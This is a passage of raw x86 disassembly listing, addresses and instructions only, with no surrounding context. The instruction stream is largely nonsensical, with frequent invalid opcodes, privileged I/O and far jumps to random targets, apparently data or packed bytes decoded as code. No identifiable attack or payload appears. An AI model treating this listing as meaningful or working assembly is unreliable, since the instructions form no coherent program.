  4152aa:	sub    eax,0x5379ccfb
  4152af:	outs   dx,DWORD PTR ds:[esi]
  4152b0:	lods   eax,DWORD PTR ds:[esi]
  4152b1:	pop    esp
  4152b2:	inc    ebx
  4152b3:	lods   al,BYTE PTR ds:[esi]
  4152b4:	mov    BYTE PTR [eax],bh
  4152b6:	shl    DWORD PTR [esi-0x6159fbd7],1
  4152bc:	mov    bh,0xf6
  4152be:	je     0x41525d
  4152c0:	sub    al,0x3b
  4152c2:	xchg   BYTE PTR [edx+0x686b3358],bh
  4152c8:	rcr    DWORD PTR [edx],0xfa
  4152cb:	xor    DWORD PTR [edx+0x4b596b64],esi
  4152d1:	ins    BYTE PTR es:[edi],dx
  4152d2:	inc    ebx
  4152d3:	or     DWORD PTR [ebx],ebx
  4152d5:	jg     0x41530d
  4152d7:	mov    dl,0xaf
  4152d9:	sub    BYTE PTR [ebx-0x19b110a0],0xcf
  4152e0:	sub    BYTE PTR [edx+0x6c9f55b9],dh
  4152e6:	pop    ebp
  4152e7:	adc    eax,0xea00d9da
  4152ec:	xchg   edi,eax
  4152ed:	pop    eax
  4152ee:	das    
  4152ef:	xchg   esp,edx
  4152f1:	je     0x4152c8
  4152f3:	or     DWORD PTR [ebx+0x9],esi
  4152f6:	stos   BYTE PTR es:[edi],al
  4152f7:	sub    eax,0x7e98781
  4152fc:	ret    0x82a8
  4152ff:	arpl   WORD PTR [edi],dx
  415301:	and    eax,0x44b21392
  415306:	div    DWORD PTR [eax]
  415308:	neg    DWORD PTR ds:0xfb9fc611
  41530e:	jmp    0x4152e1
  415310:	push   0xbcd10674
  415315:	mov    ds:0x2c94a703,al
  41531a:	sbb    eax,0xc4158a92
  41531f:	pop    edx
  415320:	test   BYTE PTR ds:0xb1d28f71,0x27
  415327:	xchg   ebx,ecx
  415329:	add    esi,DWORD PTR [ebx+eiz*1]
  41532c:	outs   dx,BYTE PTR ds:[esi]
  41532d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41532e:	xchg   ecx,eax
  41532f:	(bad)  
  415330:	adc    dh,BYTE PTR [esi+0x56dc4326]
  415336:	idiv   BYTE PTR [edi]
  415338:	mov    ds:0x21c81ae1,eax
  41533e:	pop    eax
  41533f:	mov    ebx,0x9d1533b7
  415344:	cdq    
  415345:	loopne 0x415369
  415347:	jl     0x41535d
  415349:	xor    dl,al
  41534b:	nop
  41534c:	(bad)  
  41534d:	icebp  
  41534e:	cmp    bh,BYTE PTR [ebx]
  415350:	out    dx,al
  415351:	ja     0x41533e
  415353:	pop    ecx
  415354:	mov    ds:0xb40cd7da,eax
  415359:	mov    ds,ecx
  41535b:	stos   BYTE PTR es:[edi],al
  41535c:	sbb    DWORD PTR [edx-0x3de1d0ad],esp
  415362:	mov    al,0x5c
  415364:	mov    bh,0x53
  415366:	mov    eax,ds:0x73874d5b
  41536b:	fcmovnb st,st(4)
  41536d:	xchg   BYTE PTR [ebx-0x55e3046c],dl
  415373:	inc    ecx
  415374:	sbb    eax,0xc6a01b50
  415379:	xchg   edx,eax
  41537a:	test   DWORD PTR [eax+ecx*4],ebp
  41537d:	push   cs
  41537e:	ss pop ebx
  415380:	test   eax,0xfeedc175
  415385:	ins    BYTE PTR es:[edi],dx
  415386:	ds sbb eax,0xaab4f87e
  41538c:	pop    edx
  41538d:	cdq    
  41538e:	or     al,0x99
  415390:	pop    ecx
  415391:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415392:	lea    esi,[edx]
  415394:	arpl   WORD PTR [eax+0x79],di
  415397:	cmp    bl,0xd6
  41539a:	mov    esp,0xd8d6bafc
  41539f:	shl    BYTE PTR [esi-0x74e5c243],1
  4153a5:	arpl   WORD PTR ds:[eax-0x4fdf568f],bx
  4153ac:	popa   
  4153ad:	ds jne 0x4153b3
  4153b0:	dec    edi
  4153b1:	std    
  4153b2:	sbb    BYTE PTR [ecx-0x39e98814],bl
  4153b8:	arpl   WORD PTR [edi-0x59],si
  4153bb:	call   0x60cf83f
  4153c0:	sbb    bh,BYTE PTR ds:0xd69bc9e2
  4153c6:	scas   eax,DWORD PTR es:[edi]
  4153c7:	lahf   
  4153c8:	jmp    0xdd32:0x6860a874
  4153cf:	adc    edx,DWORD PTR [edi+0x2d]
  4153d2:	xchg   edi,eax
  4153d3:	dec    esp
  4153d4:	mov    ss,WORD PTR [eax+0x7294c9f7]
  4153da:	dec    edx
  4153db:	pop    edi
  4153dc:	xchg   ecx,eax
  4153dd:	xchg   ebp,eax
  4153de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153df:	add    esi,eax
  4153e1:	push   ecx
  4153e2:	sub    BYTE PTR [esi-0x11],dh
  4153e5:	clc    
  4153e6:	cmp    eax,0x97e8375b
  4153eb:	dec    edi
  4153ec:	inc    edi
  4153ed:	mov    ch,0xf1
  4153ef:	adc    ecx,DWORD PTR [eax+0x24]
  4153f2:	inc    edi
  4153f3:	dec    eax
  4153f4:	push   eax
  4153f6:	or     eax,0x73e2da0d
  4153fb:	fwait
  4153fc:	push   edi
  4153fd:	dec    esp
  4153fe:	jno    0x4153fe
  415400:	bound  ecx,QWORD PTR [edi-0x2f]
  415403:	mov    ebp,esi
  415405:	ds jb  0x4153c7
  415408:	xor    BYTE PTR [ebp+0x6e256be8],dh
  41540e:	test   BYTE PTR [esi-0x61534735],bl
  415414:	ds out 0x1a,al
  415417:	push   0xffffffc6
  415419:	neg    BYTE PTR [ecx]
  41541b:	nop
  41541c:	pop    es
  41541d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41541e:	and    DWORD PTR ds:0xd91c92f2,ebx
  415424:	and    DWORD PTR [ebx-0x7f56b891],edi
  41542a:	sbb    ebp,DWORD PTR [edx]
  41542c:	dec    edi
  41542d:	add    BYTE PTR [ecx+0x22],ah
  415430:	(bad)  
  415432:	mov    ch,0x3c
  415434:	shl    DWORD PTR [eax-0x6c],1
  415437:	mov    ds,ebp
  415439:	dec    ebx
  41543a:	nop
  41543b:	dec    ebx
  41543c:	mov    edi,0x16c45a30
  415441:	stos   DWORD PTR es:[edi],eax
  415442:	(bad)  
  415443:	ins    DWORD PTR es:[edi],dx
  415444:	jmp    0xb471cd06
  415449:	xor    dh,BYTE PTR [esi]
  41544b:	and    DWORD PTR [ecx],0xffffffd4
  41544e:	mov    BYTE PTR [ebx],dl
  415450:	xor    ebx,DWORD PTR [ebx-0x35026126]
  415456:	fst    QWORD PTR [eax]
  415458:	je     0x4153ef
  41545a:	popf   
  41545b:	pop    ecx
  41545c:	rol    BYTE PTR [edx+0xffbbf6a],0x26
  415463:	call   0x41651e20
  415468:	je     0x4154af
  41546a:	addr16 imul ebx,ecx,0x47
  41546e:	cmp    al,bh
  415470:	and    eax,0x16d64e56
  415475:	test   al,0x80
  415477:	mov    edx,0x613bbcdb
  41547c:	cmp    DWORD PTR [ebx-0x63],edi
  41547f:	pop    edi
  415480:	dec    edi
  415481:	push   cs
  415482:	(bad)  
  415483:	and    bh,BYTE PTR [ebx]
  415485:	test   BYTE PTR [eax],dh
  415487:	dec    ebx
  415488:	mov    dl,0x13
  41548a:	xor    eax,0x2b435526
  41548f:	mov    eax,0xc7778ed
  415494:	(bad)  
  415495:	or     al,0xe4
  415497:	add    ecx,DWORD PTR [ebp+0x78]
  41549a:	mov    edx,0x591102f3
  41549f:	xor    cl,BYTE PTR [esi+eax*4]
  4154a2:	rol    BYTE PTR [eax-0x513a77e0],0xe8
  4154a9:	imul   esp,DWORD PTR [ebp-0x49],0xeb6ad61d
  4154b0:	test   al,0xd
  4154b2:	sahf   
  4154b3:	enter  0x381f,0x1
  4154b7:	lds    ebx,FWORD PTR [edi+0x31458508]
  4154bd:	(bad)  
  4154be:	fst    QWORD PTR [edi+0x67]
  4154c1:	push   esp
  4154c2:	call   0x5e3:0x71c193a
  4154c9:	stos   BYTE PTR es:[edi],al
  4154ca:	sub    DWORD PTR [edx+0x3624bcb8],eax
  4154d0:	mov    edx,0x4c9bfa22
  4154d5:	test   al,0xbb
  4154d7:	call   FWORD PTR [ecx]
  4154d9:	sub    BYTE PTR [esi-0x699f3b30],dl
  4154df:	loopne 0x415519
  4154e1:	pop    es
  4154e2:	hlt    
  4154e3:	inc    ecx
  4154e4:	or     al,0x8
  4154e6:	xor    eax,0xf49ab221
  4154eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154ec:	cmp    eax,0x6421cb67
  4154f1:	jnp    0x4154ed
  4154f3:	push   esp
  4154f4:	and    ebx,eax
  4154f6:	sti    
  4154f7:	push   es
  4154f8:	xor    esi,ebp
  4154fa:	fsubp  st(1),st
  4154fc:	std    
  4154fd:	jg     0x4154ba
  4154ff:	jle    0x4154dd
  415501:	repz push ebx
  415503:	cdq    
  415504:	jl     0x415496
  415506:	jmp    0xc146:0xc2c1e945
  41550d:	lods   eax,DWORD PTR ds:[esi]
  41550e:	test   eax,0xc065ab51
  415513:	sub    DWORD PTR [esi],eax
  415515:	bound  ebx,QWORD PTR [edx-0x19c1883d]
  41551b:	imul   edi,DWORD PTR [edx-0x5b],0x7e3accbe
  415522:	pop    eax
  415523:	pop    ebp
  415524:	data16 ds ja 0x4154b4
  415528:	pop    ss
  415529:	mov    esi,0xb83e7c49
  41552e:	dec    esi
  41552f:	mov    ecx,0x9d4560cb
  415534:	add    DWORD PTR [edi],esp
  415536:	mov    ecx,0x7797ceca
  41553b:	push   ss
  41553c:	ret    0x7589
  41553f:	out    dx,eax
  415540:	shr    al,0xd4
  415543:	or     al,0x2f
  415545:	add    al,0x12
  415547:	int3   
  415548:	cmp    al,0x5b
  41554a:	mov    ebx,0xf571aa96
  41554f:	jmp    0x1cdb51bc
  415554:	jmp    0x4154e8
  415556:	sbb    BYTE PTR [edx],al
  415558:	adc    DWORD PTR [edi+0x6f8cf060],edx
  41555e:	cmp    BYTE PTR [edx],0x1e
  415561:	and    DWORD PTR [edi],ecx
  415563:	cmp    edi,esi
  415565:	mov    cl,0xe0
  415567:	xor    al,0x39
  415569:	aaa    
  41556a:	jecxz  0x4155d0
  41556c:	clc    
  41556d:	mov    edx,DWORD PTR [esi+0x7ae5f2c3]
  415573:	(bad)  
  415574:	out    dx,eax
  415575:	and    DWORD PTR [ecx],ebx
  415577:	fist   DWORD PTR [esi-0x7061739c]
  41557d:	mov    edx,0x45be7c40
  415582:	jle    0x4155af
  415584:	sti    
  415585:	(bad)  
  415586:	out    0xac,eax
  415588:	aad    0xa9
  41558a:	add    al,BYTE PTR [esi+0x216bceb7]
  415590:	arpl   WORD PTR [edx+0x30aa387b],sp
  415596:	mov    ebx,0x9ae14d93
  41559b:	sub    dl,cl
  41559d:	adc    al,0xee
  41559f:	mov    al,ds:0x1fa41be9
  4155a4:	pop    eax
  4155a5:	jp     0x41557f
  4155a7:	push   ss
  4155a8:	lods   al,BYTE PTR ds:[esi]
  4155a9:	jno    0x415540
  4155ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155ac:	fiadd  WORD PTR [edi+ebp*2+0x4b70836f]
  4155b3:	mov    WORD PTR [edi+0x8],gs
  4155b6:	add    dh,ah
  4155b8:	aaa    
  4155b9:	sub    al,0xfa
  4155bb:	fidiv  DWORD PTR [esi-0x55]
  4155be:	(bad)  
  4155bf:	sti    
  4155c0:	pop    eax
  4155c1:	sbb    bh,ah
  4155c3:	cs xchg esp,eax
  4155c5:	push   cs
  4155c6:	add    eax,0xedd1f236
  4155cb:	int    0xb4
  4155cd:	call   DWORD PTR [edx]
  4155cf:	mov    al,ds:0x146ed51f
  4155d4:	push   ebx
  4155d5:	retf   
  4155d6:	inc    edi
  4155d7:	loope  0x41563e
  4155d9:	addsubpd xmm3,XMMWORD PTR [ecx+0x550dce]
  4155e1:	data16 and BYTE PTR ds:[ebx+0x5dcbcfbc],bl
  4155e9:	(bad)  
  4155ea:	mov    ah,0xeb
  4155ec:	push   edi
  4155ed:	sbb    BYTE PTR [ebx],cl
  4155ef:	les    eax,FWORD PTR [edx-0x47da00e7]
  4155f5:	mov    dl,0x95
  4155f7:	push   edi
  4155f8:	cdq    
  4155f9:	mov    esi,0x108f2612
  4155fe:	cmp    dl,dh
  415600:	cmp    edx,edx
  415602:	jg     0x4155a4
  415604:	jp     0x4155b9
  415606:	loopne 0x4155ce
  415608:	(bad)  
  415609:	retf   
  41560a:	ret    0x85e2
  41560d:	rcl    BYTE PTR ds:0x699fa98a,1
  415613:	pusha  
  415614:	dec    esp
  415615:	sub    DWORD PTR [esi-0x286999eb],0x6203685d
  41561f:	aam    0x51
  415621:	jo     0x4155df
  415623:	pop    ebx
  415624:	sbb    ecx,DWORD PTR [esi+0x72adfa9]
  41562a:	(bad)  
  41562b:	mov    ecx,0x74091968
  415630:	sub    BYTE PTR [eax+eiz*8+0x43],al
  415634:	or     esi,DWORD PTR [eax-0x57d970db]
  41563a:	dec    edi
  41563b:	sub    BYTE PTR [edi+0x43],cl
  41563e:	fwait
  41563f:	ret    
  415640:	ins    DWORD PTR es:[edi],dx
  415641:	or     al,0x7c
  415643:	out    dx,eax
  415644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415645:	jmp    0x21af379d
  41564a:	pop    ebp
  41564b:	push   edx
  41564c:	pop    ebx
  41564d:	push   ebp
  41564e:	test   eax,0xe2f08020
  415653:	and    dh,BYTE PTR [esp+ebp*4-0x1d]
  415657:	add    eax,0xdadfb065
  41565c:	popf   
  41565d:	xor    esi,DWORD PTR [esi-0x28]
  415660:	sahf   
  415661:	outs   dx,DWORD PTR ds:[esi]
  415662:	(bad)  
  415663:	call   0xa59:0xe3432e03
  41566a:	out    dx,al
  41566b:	push   es
  41566c:	in     eax,dx
  41566d:	out    0xa4,al
  41566f:	dec    edx
  415670:	sbb    BYTE PTR [ebx-0x18f096a4],ch
  415676:	loope  0x415632
  415678:	cmp    al,0x95
  41567a:	mov    ah,0x40
  41567c:	push   ebp
  41567d:	and    DWORD PTR [ebx-0x693b14ec],ecx
  415683:	je     0x41567a
  415685:	cs add esi,ecx
  415688:	imul   esp,ebp,0xffffffff
  41568b:	cli    
  41568c:	push   ebx
  41568d:	mov    eax,?
  41568f:	test   DWORD PTR [edi],ebp
  415691:	jo     0x4156eb
  415693:	fmulp  st(2),st
  415695:	cs dec edi
  415697:	add    eax,0xd5543d6e
  41569c:	out    dx,al
  41569d:	daa    
  41569e:	mov    DWORD PTR [eax-0x1c],ebp
  4156a1:	loopne 0x41565f
  4156a3:	and    ch,BYTE PTR [ebx-0x1c]
  4156a6:	clc    
  4156a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156a8:	js     0x415705
  4156aa:	add    BYTE PTR [ebx],dh
  4156ac:	xchg   esp,eax
  4156ad:	adc    ah,0x1
  4156b0:	dec    eax
  4156b1:	pop    ecx
  4156b2:	(bad)  
  4156b4:	adc    edx,DWORD PTR [ebx-0x17d2176b]
  4156ba:	das    
  4156bb:	pop    es
  4156bc:	dec    ebp
  4156bd:	inc    eax
  4156be:	xchg   esp,eax
  4156bf:	mov    ah,BYTE PTR [eax+ecx*8]
  4156c2:	repz mov ds:0x14661704,al
  4156c8:	lahf   
  4156c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156ca:	mov    eax,ds:0xba228ac0
  4156cf:	dec    DWORD PTR [esi+edx*8-0x31685f93]
  4156d6:	or     eax,0xf0558df9
  4156db:	sub    dh,BYTE PTR [edx+0x46]
  4156de:	xchg   ebx,eax
  4156df:	shr    WORD PTR [ebp-0x706f1ba8],1
  4156e6:	mov    al,ds:0xaef4a82b
  4156eb:	pushf  
  4156ec:	pop    ebx
  4156ed:	sbb    al,0xe4
  4156ef:	ins    BYTE PTR es:[edi],dx
  4156f0:	mov    cl,0xec
  4156f2:	sbb    BYTE PTR [eax+0x504f1a2d],bh
  4156f8:	stos   DWORD PTR es:[edi],eax
  4156f9:	les    esi,FWORD PTR [edi-0x7a]
  4156fc:	cmp    DWORD PTR [esi*2-0x7ad1bd82],0x78a0cac9
  415707:	sub    eax,0x1a9bb59f
  41570c:	into   
  41570d:	sub    BYTE PTR [ebp+ebp*2+0x72],cl
  415711:	push   fs
  415713:	aam    0x8
  415715:	cmp    ecx,DWORD PTR [ecx-0x4584e5c3]
  41571b:	push   es
  41571c:	push   ebx
  41571d:	cmp    BYTE PTR [eax+0x7d],ch
  415720:	rcr    BYTE PTR [ebp+0x710fdc7e],1
  415726:	ss mov ebp,0xba76c66b
  41572c:	push   ebp
  41572d:	adc    eax,0xf016ffb6
  415732:	retf   
  415733:	sub    ebx,DWORD PTR [ebx]
  415735:	inc    ebx
  415736:	jno    0x415703
  415738:	xlat   BYTE PTR ds:[ebx]
  415739:	int    0xa5
  41573b:	jle    0x4156c1
  41573d:	iret   
  41573e:	loop   0x4157a7
  415740:	jp     0x41575e
  415742:	push   es
  415743:	dec    eax
  415744:	mov    bh,0xb8
  415746:	mov    bl,0xb9
  415748:	and    BYTE PTR [ebx-0x3aa1842e],dl
  41574e:	sbb    eax,0xf0cf2285
  415753:	in     eax,0x3a
  415755:	sbb    DWORD PTR [eax+edx*1],edx
  415758:	push   edi
  415759:	jp     0x41575c
  41575b:	jbe    0x41572f
  41575d:	pop    edi
  41575e:	dec    ebp
  41575f:	xlat   BYTE PTR ds:[ebx]
  415760:	sub    esp,esp
  415762:	adc    DWORD PTR ds:0x79a670e,esi
  415768:	adc    edi,DWORD PTR [edi-0x77]
  41576b:	cs xchg ecx,eax
  41576d:	xlat   BYTE PTR ds:[ebx]
  41576e:	test   BYTE PTR fs:[edi+ebp*1+0x19],dl
  415773:	push   ss
  415774:	fs imul eax,ecx,0x39414b5e
  41577b:	inc    edx
  41577c:	mov    edx,0x2d62f317
  415781:	xchg   ecx,eax
  415782:	retf   
  415783:	cmp    eax,0xa91d6df8
  415788:	xor    BYTE PTR [eax+ebp*2],cl
  41578b:	lods   eax,DWORD PTR ds:[esi]
  41578c:	loop   0x415763
  41578e:	retf   
  41578f:	dec    ecx
  415790:	shl    DWORD PTR [esi],cl
  415792:	pop    ss
  415793:	call   0x5e8a6b4c
  415798:	stc    
  415799:	add    BYTE PTR [esi],cl
  41579b:	sbb    BYTE PTR [eax+0x2b01ddbb],dl
  4157a1:	test   BYTE PTR [edx-0x6b3556a8],0xe5
  4157a8:	ins    DWORD PTR es:[edi],dx
  4157a9:	lods   eax,DWORD PTR ds:[esi]
  4157aa:	repnz rcl DWORD PTR [edi-0x2764c0f4],1
  4157b1:	push   0x581803fb
  4157b6:	imul   edi,DWORD PTR [edi-0x20],0xd
  4157ba:	in     eax,dx
  4157bb:	loopne 0x41575d
  4157bd:	lods   al,BYTE PTR ds:[esi]
  4157be:	sbb    BYTE PTR [edi+0x5edeb2ee],al
  4157c4:	fsub   QWORD PTR [edx+0x48]
  4157c7:	sbb    BYTE PTR [ebp+0x231afbc8],ah
  4157cd:	push   cs
  4157ce:	sahf   
  4157cf:	ja     0x41576c
  4157d1:	addr16 dec ebp
  4157d3:	add    eax,0xe64dd246
  4157d8:	add    eax,0x48c93b9d
  4157dd:	leave  
  4157de:	adc    eax,0x2b57b16e
  4157e3:	xchg   BYTE PTR [ecx+0x3e22a9b0],al
  4157e9:	mov    ds:0x6c5a0059,eax
  4157ee:	imul   edi,esp,0x4847f213
  4157f4:	adc    esp,edi
  4157f6:	call   0xb1a116e5
  4157fb:	dec    ecx
  4157fc:	arpl   WORD PTR [ecx+0x9ae6e02],ax
  415802:	xchg   ebp,eax
  415803:	xor    eax,0xab5202f0
  415808:	shl    BYTE PTR [edi-0x2a73ab4],cl
  41580e:	sbb    DWORD PTR [eax],ecx
  415810:	push   ds
  415811:	rdmsr  
  415813:	fdiv   QWORD PTR [edi]
  415815:	or     al,0x26
  415817:	add    BYTE PTR [edi+0x4c246ec1],dl
  41581d:	jae    0x4157ad
  41581f:	push   0x6970e0ae
  415824:	inc    edi
  415825:	dec    ebx
  415826:	ret    
  415827:	(bad)
  41582b:	clc    
  41582c:	cmp    al,0x23
  41582e:	xor    edx,DWORD PTR [edi+0x71b4d878]
  415834:	xchg   edx,eax
  415835:	xchg   edi,eax
  415836:	shl    BYTE PTR [ebx+0x6],1
  415839:	cmp    BYTE PTR [edi-0x53],bl
  41583c:	and    al,0x68
  41583e:	into   
  41583f:	mov    ds:0x82bb1465,al
  415844:	jecxz  0x4157de
  415846:	xchg   DWORD PTR [ecx],edi
  415848:	stos   DWORD PTR es:[edi],eax
  415849:	inc    eax
  41584a:	aaa    
  41584b:	cdq    
  41584c:	inc    ebp
  41584d:	clc    
  41584e:	sub    bh,ch
  415850:	pop    esp
  415851:	sbb    DWORD PTR [esi+0x3aca4961],edi
  415857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415858:	push   es
  415859:	xor    al,0x41
  41585b:	mov    ebx,0x8e0fc8c8
  415860:	fst    DWORD PTR [edi]
  415862:	pop    edx
  415863:	jg     0x415846
  415865:	cmp    eax,0x43cc60d2
  41586a:	(bad)  
  41586b:	adc    ch,BYTE PTR [ebp+esi*4-0x63]
  41586f:	pusha  
  415870:	call   0x1642:0x6f538da9
  415877:	test   eax,0x15963b85
  41587c:	add    dh,BYTE PTR [edx]
  41587e:	jmp    0xa5da27fc
  415883:	imul   BYTE PTR [ecx]
  415885:	pop    esp
  415886:	test   bh,bl
  415888:	cmc    
  415889:	aam    0xa9
  41588b:	and    eax,0x1708d145
  415890:	sahf   
  415891:	jmp    0x4158bd
  415893:	psubd  mm7,QWORD PTR [ebx]
  415896:	gs jne 0x41582b
  415899:	jne    0x41587a
  41589b:	(bad)  
  41589c:	aam    0x25
  41589e:	mov    bl,0x83
  4158a0:	dec    ebp
  4158a1:	mov    al,BYTE PTR [edi]
  4158a3:	ret    
  4158a4:	repnz cmp DWORD PTR [edi+0x6b858deb],ebp
  4158ab:	add    al,0xd8
  4158ad:	aas    
  4158ae:	inc    ebp
  4158af:	xor    DWORD PTR [ecx],0x618f33b1
  4158b5:	mov    cl,0x96
  4158b7:	aas    
  4158b8:	xchg   ebp,eax
  4158b9:	shl    DWORD PTR [esi-0x13ec9443],cl
  4158bf:	std    
  4158c0:	add    DWORD PTR [esp+eax*1],edi
  4158c3:	cwde   
  4158c4:	adc    ch,dh
  4158c6:	mov    ebx,DWORD PTR [esi-0x17]
  4158c9:	dec    ebp
  4158ca:	jp     0x415941
  4158cc:	sbb    al,0x7a
  4158ce:	dec    ebp
  4158cf:	sbb    ah,dl
  4158d1:	test   eax,0x8af39d1
  4158d6:	push   0xaf0aca00
  4158db:	pop    ebx
  4158dc:	pop    DWORD PTR [eax+0x18]
  4158df:	xchg   edi,eax
  4158e0:	and    DWORD PTR [ebp+0x8],eax
  4158e3:	push   es
  4158e4:	outs   dx,BYTE PTR ds:[esi]
  4158e5:	arpl   WORD PTR gs:[esi+edi*8],sp
  4158e9:	repnz pusha 
  4158eb:	jbe    0x415930
  4158ed:	mov    ds:0xc5a0c11f,al
  4158f2:	sbb    ecx,DWORD PTR [esi-0x7f00a484]
  4158f8:	mov    bh,0xe4
  4158fb:	push   esi
  4158fc:	outs   dx,DWORD PTR ds:[esi]
  4158fd:	pop    ecx
  4158fe:	not    DWORD PTR [edi+0x37]
  415901:	pop    ecx
  415902:	ffreep st(2)
  415904:	ret    
  415905:	ret    
  415906:	hlt    
  415907:	and    ebx,DWORD PTR [ebx*2+0x4a3eeba0]
  41590e:	and    ecx,DWORD PTR [ebp-0x7e1c05c7]
  415914:	je     0x4158a9
  415916:	push   edi
  415917:	lods   al,BYTE PTR ds:[esi]
  415918:	outs   dx,DWORD PTR ds:[esi]
  415919:	ja     0x415943
  41591b:	iret   
  41591c:	pop    ds
  41591d:	sbb    dh,dl
  41591f:	inc    esi
  415920:	mov    ds:0x97ac4eee,al
  415925:	dec    esi
  415926:	mov    ch,0xf1
  415928:	imul   eax,DWORD PTR ds:0x7d0a2000,0x1fd412cd
  415932:	pop    ds
  415933:	icebp  
  415934:	(bad)  
  415936:	cld    
  415937:	mov    WORD PTR [ebx],cs
  415939:	test   eax,0x5cda2d61
  41593e:	es push 0x19
  415941:	jle    0x41594c
  415943:	cmp    edx,eax
  415945:	test   al,0xd8
  415947:	test   eax,0x73b5aa87
  41594c:	adc    ecx,DWORD PTR [esi-0x2]
  41594f:	xchg   ebp,eax
  415950:	fild   WORD PTR [ebx+0x601237ec]
  415956:	dec    esp
  415957:	xor    edx,DWORD PTR [ebx-0x30fd3b26]
  41595d:	cli    
  41595e:	in     al,dx
  41595f:	dec    DWORD PTR [ebx-0x41]
  415962:	mov    ch,0xa0
  415964:	nop
  415965:	sahf   
  415966:	mov    edx,0xf1e7330a
  41596b:	fiadd  DWORD PTR [esp+ebx*4+0x4a]
  41596f:	call   0x70d0b642
  415974:	xor    edi,esi
  415976:	dec    ecx
  415977:	jg     0x4159e5
  415979:	icebp  
  41597a:	or     BYTE PTR [eax-0x2af8c34a],bh
  415980:	sub    eax,0x508bbb0c
  415985:	cmp    edx,edx
  415987:	inc    ecx
  415988:	aaa    
  415989:	inc    esp
  41598a:	or     al,0x46
  41598c:	addr16 mov eax,ds:0x45cf
  415990:	les    edi,FWORD PTR [eax-0xd]
  415993:	cmp    ebp,DWORD PTR [eax]
  415995:	and    eax,0x2a13d1e7
  41599a:	ja     0x415979
  41599c:	imul   esi,DWORD PTR [ecx-0x2a],0xa7195f5c
  4159a3:	pusha  
  4159a4:	sbb    al,0xca
  4159a6:	repz jbe 0x41593d
  4159a9:	fsin   
  4159ab:	and    eax,edi
  4159ad:	mov    esp,0xcd0766bb
  4159b2:	(bad)  
  4159b4:	xor    esp,esp
  4159b6:	sub    ebp,DWORD PTR [eax]
  4159b8:	lea    edx,[edi-0x378d642]
  4159be:	mov    bh,0x11
  4159c0:	loope  0x415988
  4159c2:	jle    0x415a00
  4159c4:	mov    al,0x6a
  4159c6:	js     0x4159b6
  4159c8:	push   ds
  4159c9:	lock push 0x530dfd1b
  4159cf:	mov    eax,0xf009765d
  4159d4:	clc    
  4159d5:	imul   edx,DWORD PTR [eax],0x45
  4159d8:	mov    esp,0x60f1a47e
  4159dd:	lods   al,BYTE PTR ds:[esi]
  4159de:	loope  0x4159c1
  4159e0:	not    DWORD PTR [ecx]
  4159e2:	loop   0x415a26
  4159e4:	sbb    DWORD PTR [edx+0x4b],eax
  4159e7:	out    dx,al
  4159e8:	ret    
  4159e9:	out    0x7b,eax
  4159eb:	cmp    DWORD PTR [edx+0x63dfafdc],eax
  4159f1:	into   
  4159f2:	mov    bh,0xff
  4159f4:	inc    ecx
  4159f5:	xchg   ebp,eax
  4159f6:	xchg   ebp,ecx
  4159f8:	les    ecx,FWORD PTR [ebx+edi*2+0x18]
  4159fc:	inc    esp
  4159fd:	mov    edi,0x7bdbda3e
  415a02:	inc    BYTE PTR [edi+eiz*8-0x12]
  415a06:	test   BYTE PTR [eax],0x6c
  415a09:	sbb    edx,DWORD PTR [eax-0x1e]
  415a0c:	in     eax,dx
  415a0d:	or     edi,DWORD PTR [ecx-0x2bf09b07]
  415a13:	or     DWORD PTR [ebx+0x47c24e51],esp
  415a19:	iret   
  415a1a:	scas   eax,DWORD PTR es:[edi]
  415a1b:	cld    
  415a1c:	js     0x4159ee
  415a1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a1f:	test   al,0x57
  415a21:	mov    ds:0x8a01848f,al
  415a26:	jp     0x415a7f
  415a28:	mov    dl,0xd4
  415a2a:	(bad)  
  415a2c:	loop   0x415a7a
  415a2e:	scas   al,BYTE PTR es:[edi]
  415a2f:	call   0x56db4495
  415a34:	pop    ebx
  415a35:	xchg   esp,eax
  415a36:	sbb    ebp,DWORD PTR [ecx-0x1d8e1aac]
  415a3c:	mov    al,ds:0xcbed9e9f
  415a41:	out    dx,al
  415a42:	or     eax,DWORD PTR [edx]
  415a44:	je     0x4159ca
  415a46:	aam    0xb7
  415a48:	push   0x99f706a1
  415a4d:	(bad)  
  415a4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a4f:	popa   
  415a50:	add    eax,0x79de03b3
  415a55:	push   esi
  415a56:	in     al,dx
  415a57:	in     eax,0x9a
  415a59:	inc    esi
  415a5a:	pop    ebp
  415a5b:	call   0x1f256888
  415a60:	lods   eax,DWORD PTR ds:[esi]
  415a61:	in     eax,0x14
  415a63:	rcr    BYTE PTR [edx+0x70ba7bd],1
  415a69:	aaa    
  415a6a:	inc    edx
  415a6b:	sub    cl,BYTE PTR [eax+0x1c]
  415a6e:	outs   dx,DWORD PTR ds:[esi]
  415a6f:	xchg   ebp,eax
  415a70:	mov    ebx,0x25a906f6
  415a75:	jecxz  0x415a24
  415a77:	push   esi
  415a78:	in     eax,dx
  415a79:	out    dx,eax
  415a7a:	in     eax,dx
  415a7b:	(bad)  
  415a7c:	mov    ecx,0xc8a892cb
  415a81:	or     BYTE PTR [eax],0x9c
  415a84:	mov    DWORD PTR [ebp-0x11ea6e0],eax
  415a8a:	fdivr  st(2),st
  415a8c:	daa    
  415a8d:	and    BYTE PTR [eax-0x3a],ah
  415a90:	push   edx
  415a91:	into   
  415a92:	fwait
  415a93:	neg    DWORD PTR [esi+0x4b]
  415a96:	add    BYTE PTR [edx],ah
  415a98:	mov    ?,esi
  415a9a:	sti    
  415a9b:	js     0x415ab7
  415a9d:	dec    bp
  415a9f:	jo     0x415afa
  415aa1:	scas   al,BYTE PTR es:[edi]
  415aa2:	popa   
  415aa3:	arpl   WORD PTR [ebx+0x177cb627],bp
  415aa9:	push   edx
  415aaa:	fstp   QWORD PTR [ecx-0x30]
  415aad:	sbb    BYTE PTR [esi+0x16],al
  415ab0:	(bad)  
  415ab2:	push   es
  415ab3:	inc    esp
